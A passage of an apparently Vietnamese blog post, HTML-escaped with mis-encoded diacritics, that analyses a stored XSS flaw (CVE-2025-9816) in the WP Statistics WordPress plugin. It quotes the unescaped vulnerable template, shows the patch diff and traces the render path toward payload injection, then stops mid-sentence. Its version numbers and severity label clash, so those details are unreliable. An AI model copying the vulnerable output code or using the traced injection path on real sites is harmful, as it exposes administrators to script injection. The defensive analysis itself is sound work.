Most Popular Privacy-Friendly Analytics Plugin&lt;/strong&gt; cho WordPress m·∫Øc l·ªó h·ªïng &lt;strong&gt;Stored Cross-Site Scripting (XSS)&lt;/strong&gt; qua &lt;strong&gt;User-Agent Header&lt;/strong&gt; trong t·∫•t c·∫£ c√°c phi√™n b·∫£n t·ª´ tr∆∞·ªõc ƒë·∫øn &lt;strong&gt;14.5.4&lt;/strong&gt; (bao g·ªìm c·∫£ 14.5.4). Nguy√™n nh√¢n xu·∫•t ph√°t t·ª´ vi·ªác &lt;strong&gt;ki·ªÉm tra v√† l·ªçc d·ªØ li·ªáu ƒë·∫ßu v√†o&lt;/strong&gt; c≈©ng nh∆∞ &lt;strong&gt;tho√°t d·ªØ li·ªáu ƒë·∫ßu ra&lt;/strong&gt; ch∆∞a ƒë·∫ßy ƒë·ªß.&lt;/p&gt;&#xA;&lt;p&gt;L·ªó h·ªïng n√†y cho ph√©p &lt;strong&gt;k·∫ª t·∫•n c√¥ng kh√¥ng c·∫ßn x√°c th·ª±c&lt;/strong&gt; ch√®n c√°c ƒëo·∫°n m√£ JavaScript ƒë·ªôc h·∫°i v√†o h·ªá th·ªëng. C√°c ƒëo·∫°n m√£ n√†y s·∫Ω ƒë∆∞·ª£c th·ª±c thi m·ªói khi ng∆∞·ªùi d√πng truy c·∫≠p v√†o trang c√≥ ch·ª©a d·ªØ li·ªáu ƒë√£ b·ªã ch√®n m√£ ƒë·ªôc, g√¢y ra nguy c∆° nghi√™m tr·ªçng cho b·∫£o m·∫≠t v√† quy·ªÅn ri√™ng t∆∞.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-9816&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-9816&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Cross Site Scripting (XSS)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 14.15.4&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 14.15.5&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Medium (7.1)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/wp-statistics/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress WP Statistics Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin versions&lt;/strong&gt; - &lt;strong&gt;WP Statistics&lt;/strong&gt;: &lt;strong&gt;v14.15.4&lt;/strong&gt; (vulnerable) v√† &lt;strong&gt;v14.15.5&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• so s√°nh (diff) n√†o ƒë·ªÉ ki·ªÉm tra v√† so s√°nh kh√°c bi·ªát gi·ªØa hai phi√™n b·∫£n.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;T√¥i ƒë√£ thi·∫øu s√≥t trong qu√° tr√¨nh thu th·∫≠p th√¥ng tin v·ªÅ CVE n√†y, &lt;a href=&#34;https://plugins.trac.wordpress.org/browser/wp-statistics/tags/14.15.3/includes/admin/templates/pages/devices/models.php#L31&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;references&lt;/a&gt; c·ªßa &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-9816&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://www.cve.org/CVERecord?id=CVE-2025-9816&lt;/a&gt; ch·ªâ r√µ n∆°i l·ªó h·ªóng x·∫£y ra: &lt;code&gt;includes/admin/templates/pages/devices/models.php&lt;/code&gt;{: .filepath}&lt;/p&gt;&#xA;&lt;p&gt;Nh∆∞ng t√¥i ƒë√£ b·ªè qua n√≥ v√† s·ª≠ d·ª•ng &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ƒë·ªÉ so s√°nh code. Do code thay ƒë·ªïi kh√° nhi·ªÅu n√™n t√¥i ƒë√£ ch·ªß ƒë·ªông t√¨m c√°c file li√™n quan ƒë·∫øn &lt;strong&gt;user-agent&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-08-cve-2025-9816/dif1.png&#34;&#xA;    alt=&#34;Diff ‚Äî so s√°nh thay ƒë·ªïi m√£ gi·ªØa b·∫£n vulnerable v√† b·∫£n v√°&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Diff ‚Äî so s√°nh thay ƒë·ªïi m√£ gi·ªØa b·∫£n vulnerable v√† b·∫£n v√°&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;V√† code thay ƒë·ªïi trong &lt;code&gt;UserAgent.php&lt;/code&gt;{: .filepath} l√†m t√¥i tin r·∫±ng l·ªó h·ªóng th·ª±c s·ª± x·∫£y ra ·ªü ƒë√¢y.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-08-cve-2025-9816/dif2.png&#34;&#xA;    alt=&#34;Diff ‚Äî S·ª± thay ƒë·ªïi m√£ trong UserAgent.php&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Diff ‚Äî S·ª± thay ƒë·ªïi m√£ trong UserAgent.php&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;N√≥ l√†m t√¥i t·ªën kh√° nhi·ªÅu th·ªùi gian nh∆∞ng ch∆∞a th·ªÉ ph√¢n t√≠ch ƒë∆∞·ª£c. Tuy nhi√™n, vi·ªác n√†y c≈©ng gi√∫p √≠ch cho qu√° tr√¨nh ph√¢n t√≠ch.&lt;/p&gt;&#xA;&lt;p&gt;üçÄ May m·∫Øn thay, d∆∞·ªõi s·ª± h∆∞·ªõng d·∫´n c·ªßa c√°c ti·ªÅn b·ªëi, t√¥i ƒë√£ &lt;strong&gt;focus&lt;/strong&gt; v√†o ƒë√∫ng v√†o &lt;a href=&#34;https://plugins.trac.wordpress.org/browser/wp-statistics/tags/14.15.3/includes/admin/templates/pages/devices/models.php#L31&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;v·ªã tr√≠ l·ªó h·ªïng&lt;/strong&gt;&lt;/a&gt;. N√™n qu√° tr√¨nh ph√¢n t√≠ch tr·ªü n√™n d·ªÖ d√†ng h∆°n.&lt;/p&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;Tip: ƒê√¢y l√† l·ªó h·ªïng Cross Site Script di·ªÖn ra ·ªü tr√¨nh duy·ªát c·ªßa n·∫°n nh√¢n n√™n ta c·∫ßn t√¨m n∆°i render v√† tr·∫£ v·ªÅ HTML.&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;L·ªó h·ªïng x·∫£y ra trong file &lt;code&gt;includes/admin/templates/pages/devices/models.php&lt;/code&gt;{: .filepath} t·∫°i d√≤ng 31.&lt;/p&gt;&#xA;&lt;p&gt;Trong phi√™n b·∫£n &lt;strong&gt;vulnerable&lt;/strong&gt;, &lt;code&gt;$item-&amp;gt;model&lt;/code&gt; ƒë∆∞·ª£c in ra HTML nh∆∞ng &lt;strong&gt;kh√¥ng c√≥ c∆° ch·∫ø b·∫£o v·ªá n√†o&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;span title=&amp;#34;&amp;lt;?php echo \WP_STATISTICS\Admin_Template::unknownToNotSet($item-&amp;gt;model); ?&amp;gt;&amp;#34; class=&amp;#34;wps-model-name&amp;#34;&amp;gt;&#xA;    &amp;lt;?php echo self::isUnknown($item-&amp;gt;model) ? esc_html__(&amp;#39;Unknown&amp;#39;, &amp;#39;wp-statistics&amp;#39;) : $item-&amp;gt;model; ?&amp;gt;&#xA;&amp;lt;/span&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong phi√™n b·∫£n &lt;strong&gt;patched&lt;/strong&gt;, &lt;code&gt;$item-&amp;gt;model&lt;/code&gt; ƒë√£ ƒë∆∞·ª£c b·∫£o v·ªá b·∫±ng c√°ch ƒë·∫∑t n√≥ v√†o &lt;code&gt;esc_attr()&lt;/code&gt; v√† &lt;code&gt;esc_html()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;span title=&amp;#34;&amp;lt;?php echo esc_attr(\WP_STATISTICS\Admin_Template::unknownToNotSet($item-&amp;gt;model)); ?&amp;gt;&amp;#34; class=&amp;#34;wps-model-name&amp;#34;&amp;gt;&#xA;    &amp;lt;?php echo self::isUnknown($item-&amp;gt;model) ? esc_html__(&amp;#39;Unknown&amp;#39;, &amp;#39;wp-statistics&amp;#39;) : esc_html($item-&amp;gt;model); ?&amp;gt;&#xA;&amp;lt;/span&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;üëâ B·∫£n v√° b·ªï sung l·ªõp l·ªçc ƒë·∫ßu v√†o cho &lt;code&gt;$item-&amp;gt;model&lt;/code&gt;, ƒë·∫£m b·∫£o n√≥ s·∫Ω ƒë∆∞·ª£c &lt;strong&gt;escape&lt;/strong&gt; tr∆∞·ªõc khi in ra HTML.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-08-cve-2025-9816/dif3.png&#34;&#xA;    alt=&#34;Diff ‚Äî S·ª± thay ƒë·ªïi m√£ trong models.php&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Diff ‚Äî S·ª± thay ƒë·ªïi m√£ trong models.php&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;?php&#xA;use WP_STATISTICS\Helper;&#xA;?&amp;gt;&#xA;&#xA;&amp;lt;div class=&amp;#34;postbox-container wps-postbox-full&amp;#34;&amp;gt;&#xA;  &amp;lt;?php if (!empty($data[&amp;#39;visitors&amp;#39;])) : ?&amp;gt;&#xA;      &amp;lt;div class=&amp;#34;o-table-wrapper&amp;#34;&amp;gt;&#xA;          &amp;lt;table width=&amp;#34;100%&amp;#34; class=&amp;#34;o-table wps-new-table&amp;#34;&amp;gt;&#xA;              &amp;lt;thead&amp;gt;&#xA;              &amp;lt;/thead&amp;gt;&#xA;              &amp;lt;tbody&amp;gt;&#xA;                  &amp;lt;?php foreach ($data[&amp;#39;visitors&amp;#39;] as $item) : ?&amp;gt;&#xA;                      &amp;lt;tr&amp;gt;&#xA;                          &amp;lt;td class=&amp;#34;wps-pd-l&amp;#34;&amp;gt;&#xA;                              &amp;lt;span title=&amp;#34;&amp;lt;?php echo \WP_STATISTICS\Admin_Template::unknownToNotSet($item-&amp;gt;model); ?&amp;gt;&amp;#34; class=&amp;#34;wps-model-name&amp;#34;&amp;gt;&#xA;                                  &amp;lt;?php echo self::isUnknown($item-&amp;gt;model) ? esc_html__(&amp;#39;Unknown&amp;#39;, &amp;#39;wp-statistics&amp;#39;) : $item-&amp;gt;model; ?&amp;gt;&#xA;                              &amp;lt;/span&amp;gt;&#xA;                          &amp;lt;/td&amp;gt;&#xA;                      &amp;lt;/tr&amp;gt;&#xA;                  &amp;lt;?php endforeach; ?&amp;gt;&#xA;              &amp;lt;/tbody&amp;gt;&#xA;          &amp;lt;/table&amp;gt;&#xA;      &amp;lt;/div&amp;gt;&#xA;  &amp;lt;?php else : ?&amp;gt;&#xA;      &amp;lt;div class=&amp;#34;o-wrap o-wrap--no-data wps-center&amp;#34;&amp;gt;&#xA;          &amp;lt;?php esc_html_e(&amp;#39;No recent data available.&amp;#39;, &amp;#39;wp-statistics&amp;#39;); ?&amp;gt;&#xA;      &amp;lt;/div&amp;gt;&#xA;  &amp;lt;?php endif; ?&amp;gt;&#xA;&amp;lt;/div&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;N·∫øu &lt;code&gt;$data&lt;/code&gt; kh√¥ng r·ªóng th√¨ duy·ªát qua &lt;code&gt;$data&lt;/code&gt; v√† hi·ªÉn th·ªã d·ªØ li·ªáu ƒë√£ th·ªëng k√™ c·ªßa &lt;strong&gt;visitors&lt;/strong&gt;, bao g·ªìm &lt;code&gt;model&lt;/code&gt;.&#xA;N·∫øu r·ªóng th√¨ in ra &lt;code&gt;No recent data available.&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function isUnknown($value)&#xA;{&#xA;    if (empty($value) or $value == &amp;#39;Unknown&amp;#39; or $value == __(&amp;#34;Unknown&amp;#34;, &amp;#39;wp-statistics&amp;#39;)) {&#xA;        return true;&#xA;    }&#xA;&#xA;    return false;&#xA;}&#xA;&#xA;public static function unknownToNotSet($value)&#xA;{&#xA;    if (self::isUnknown($value)) {&#xA;        return __(&amp;#39;(not set)&amp;#39;, &amp;#39;wp-statistics&amp;#39;);&#xA;    }&#xA;    return $value;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;unknownToNotSet()&lt;/code&gt; s·∫Ω tr·∫£ v·ªÅ &lt;code&gt;(not set)&lt;/code&gt; n·∫øu &lt;code&gt;$item-&amp;gt;model&lt;/code&gt; r·ªóng, &lt;code&gt;Unknown&lt;/code&gt;, &lt;code&gt;Unknown&lt;/code&gt; theo t·ª´ng ng√¥n ng·ªØ.&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;__(&amp;quot;Unknown&amp;quot;, &#39;wp-statistics&#39;)&lt;/code&gt; s·∫Ω t√¨m b·∫£n d·ªãch c·ªßa &lt;code&gt;Unknown&lt;/code&gt; trong file d·ªãch &lt;code&gt;.po&lt;/code&gt;/&lt;code&gt;.mo&lt;/code&gt; c·ªßa text domain &lt;code&gt;wp-statistics&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;üëâ Kh√¥ng c√≥ c∆° ch·∫ø b·∫£o v·ªá &lt;code&gt;$item-&amp;gt;model&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;$data&lt;/code&gt; kh√¥ng ƒë∆∞·ª£c kh·ªüi t·∫°o trong file n√†y n√™n ch·∫Øc ch·∫Øn r·∫Øng n√≥ ƒë∆∞·ª£c kh·ªüi t·∫°o t·ª´ n∆°i kh√°c v√† &lt;code&gt;models.php&lt;/code&gt;{: .filepath} s·∫Ω s·ª≠ d·ª•ng n√≥ khi ƒë∆∞·ª£c include.&#xA;Ta c√≥ th·ªÉ search b·∫±ng t·ª´ kh√≥a &lt;code&gt;models.php&lt;/code&gt; ƒë·ªÉ t√¨m ƒë·∫øn n∆°i g·ªçi ƒë·∫øn n√≥, nh∆∞ng ·ªü ƒë√¢y n√≥ ƒë∆∞·ª£c &lt;strong&gt;include&lt;/strong&gt; ƒë·ªông. Thay v√†o ƒë√≥, ta search v·ªõi t√™n th∆∞ m·ª•c ch·ª©a n√≥ &lt;code&gt;pages/devices&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-08-cve-2025-9816/search1.png&#34;&#xA;    alt=&#34;Diff ‚Äî C√°ch c√°c template ƒë∆∞·ª£c g·ªçi ƒë·ªông&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Diff ‚Äî C√°ch c√°c template ƒë∆∞·ª£c g·ªçi ƒë·ªông&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;üëâ &lt;code&gt;models.php&lt;/code&gt;{: .filepath} s·∫Ω ƒë∆∞·ª£c g·ªçi ƒë·ªông trong h√†m &lt;code&gt;render()&lt;/code&gt; c·ªßa class &lt;code&gt;TabsView&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;class TabsView extends BaseTabView&#xA;{&#xA;    public function render()&#xA;    {&#xA;        $currentTab  = $this-&amp;gt;getCurrentTab();&#xA;        $data        = $this-&amp;gt;getTabData();&#xA;&#xA;        $args = [&#xA;            &amp;#39;title&amp;#39;           =&amp;gt; esc_html__(&amp;#39;Devices&amp;#39;, &amp;#39;wp-statistics&amp;#39;),&#xA;            &amp;#39;pageName&amp;#39;        =&amp;gt; Menus::get_page_slug(&amp;#39;devices&amp;#39;),&#xA;            &amp;#39;paged&amp;#39;           =&amp;gt; Admin_Template::getCurrentPaged(),&#xA;            &amp;#39;custom_get&amp;#39;      =&amp;gt; [&amp;#39;tab&amp;#39; =&amp;gt; $currentTab],&#xA;            &amp;#39;data&amp;#39;            =&amp;gt; $data,&#xA;            &amp;#39;viewMoreUrlArgs&amp;#39; =&amp;gt; [&amp;#39;type&amp;#39; =&amp;gt; &amp;#39;single-&amp;#39; . rtrim($currentTab, &amp;#39;s&amp;#39;), &amp;#39;from&amp;#39; =&amp;gt; Request::get(&amp;#39;from&amp;#39;), &amp;#39;to&amp;#39; =&amp;gt; Request::get(&amp;#39;to&amp;#39;)],&#xA;            &amp;#39;tabs&amp;#39;            =&amp;gt; [&#xA;                [&#xA;                    &amp;#39;link&amp;#39;        =&amp;gt; Menus::admin_url(&amp;#39;devices&amp;#39;, [&amp;#39;tab&amp;#39; =&amp;gt; &amp;#39;overview&amp;#39;]),&#xA;                    &amp;#39;title&amp;#39;       =&amp;gt; esc_html__(&amp;#39;Overview&amp;#39;, &amp;#39;wp-statistics&amp;#39;),&#xA;                ],&#xA;                [&#xA;                    &amp;#39;link&amp;#39;        =&amp;gt; Menus::admin_url(&amp;#39;devices&amp;#39;, [&amp;#39;tab&amp;#39; =&amp;gt; &amp;#39;browsers&amp;#39;]),&#xA;                    &amp;#39;title&amp;#39;       =&amp;gt; esc_html__(&amp;#39;Browsers&amp;#39;, &amp;#39;wp-statistics&amp;#39;),&#xA;                ],&#xA;                [&#xA;                    &amp;#39;link&amp;#39;        =&amp;gt; Menus::admin_url(&amp;#39;devices&amp;#39;, [&amp;#39;tab&amp;#39; =&amp;gt; &amp;#39;platforms&amp;#39;]),&#xA;                    &amp;#39;title&amp;#39;       =&amp;gt; esc_html__(&amp;#39;Operating Systems&amp;#39;, &amp;#39;wp-statistics&amp;#39;),&#xA;                ],&#xA;                [&#xA;                    &amp;#39;link&amp;#39;        =&amp;gt; Menus::admin_url(&amp;#39;devices&amp;#39;, [&amp;#39;tab&amp;#39; =&amp;gt; &amp;#39;models&amp;#39;]),&#xA;                    &amp;#39;title&amp;#39;       =&amp;gt; esc_html__(&amp;#39;Device Models&amp;#39;, &amp;#39;wp-statistics&amp;#39;),&#xA;                ],&#xA;                [&#xA;                    &amp;#39;link&amp;#39;        =&amp;gt; Menus::admin_url(&amp;#39;devices&amp;#39;, [&amp;#39;tab&amp;#39; =&amp;gt; &amp;#39;categories&amp;#39;]),&#xA;                    &amp;#39;title&amp;#39;       =&amp;gt; esc_html__(&amp;#39;Device Categories&amp;#39;, &amp;#39;wp-statistics&amp;#39;),&#xA;                ]&#xA;            ],&#xA;        ];&#xA;&#xA;        Admin_Template::get_template([&amp;#39;layout/header&amp;#39;, &amp;#39;layout/tabbed-page-header&amp;#39;, &amp;#34;pages/devices/$currentTab&amp;#34;, &amp;#39;layout/postbox.hide&amp;#39;, &amp;#39;layout/footer&amp;#39;], $args);&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;C√≥ s·ª± t∆∞∆°ng quan gi·ªØa c√°c gi√° tr·ªã trong &lt;code&gt;$args&lt;/code&gt; v√† submenu &lt;strong&gt;Devices&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-08-cve-2025-9816/submenu.png&#34;&#xA;    alt=&#34;Diff ‚Äî S·ª± t∆∞∆°ng quan gi·ªØa c√°c gi√° tr·ªã trong $args v√† submenu Devices&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Diff ‚Äî S·ª± t∆∞∆°ng quan gi·ªØa c√°c gi√° tr·ªã trong $args v√† submenu Devices&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;Gi√° tr·ªã &lt;code&gt;tab&lt;/code&gt; trong &lt;code&gt;args&lt;/code&gt; s·∫Ω t∆∞∆°ng ·ª©ng v·ªõi param &lt;code&gt;tab&lt;/code&gt; tr√™n URL =&amp;gt; Ph·∫°m vi truy v·∫øt n·∫±m trong submenu &lt;strong&gt;Devices&lt;/strong&gt; c·ªßa admin panel. Ta c·∫ßn x√°c ƒë·ªãnh &lt;code&gt;$currentTab&lt;/code&gt; ƒë·ªÉ bi·∫øt c√°ch &lt;code&gt;render()&lt;/code&gt; g·ªçi ƒë·∫øn &lt;code&gt;models.php&lt;/code&gt;{: .filepath} v√† &lt;code&gt;$data&lt;/code&gt; ƒë·ªÉ inject payload.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Bi·∫øn $currentTab&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;// $currentTab  = $this-&amp;gt;getCurrentTab();&#xA;protected function getCurrentTab()&#xA;{&#xA;    return Request::get(&amp;#39;tab&amp;#39;, $this-&amp;gt;defaultTab);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;getCurrentTab()&lt;/code&gt; tr·∫£ v·ªÅ gi√° tr·ªã c·ªßa &lt;code&gt;Request::get()&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;// $param=&amp;#39;tab&amp;#39;&#xA;public static function get($param, $default = false, $return = &amp;#39;string&amp;#39;)&#xA;{&#xA;    if (empty($_REQUEST[$param])) return $default;&#xA;&#xA;    $value = $_REQUEST[$param];&#xA;&#xA;    if ($return === &amp;#39;string&amp;#39;) {&#xA;        return sanitize_text_field($value);&#xA;    }&#xA;&#xA;    if ($return === &amp;#39;url&amp;#39;) {&#xA;        return sanitize_url($value);&#xA;    }&#xA;&#xA;    if ($return === &amp;#39;number&amp;#39;) {&#xA;        return intval($value);&#xA;    }&#xA;&#xA;    if ($return === &amp;#39;text&amp;#39;) {&#xA;        return sanitize_textarea_field($value);&#xA;    }&#xA;&#xA;    if ($return === &amp;#39;bool&amp;#39;) {&#xA;        return boolval($value);&#xA;    }&#xA;&#xA;    if ($return === &amp;#39;array&amp;#39; &amp;amp;&amp;amp; is_array($value)) {&#xA;        return array_map(&amp;#39;sanitize_text_field&amp;#39;, $value);&#xA;    }&#xA;&#xA;    return $value;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;üëâ &lt;code&gt;get()&lt;/code&gt; tr·∫£ v·ªÅ gi√° tr·ªã c·ªßa param 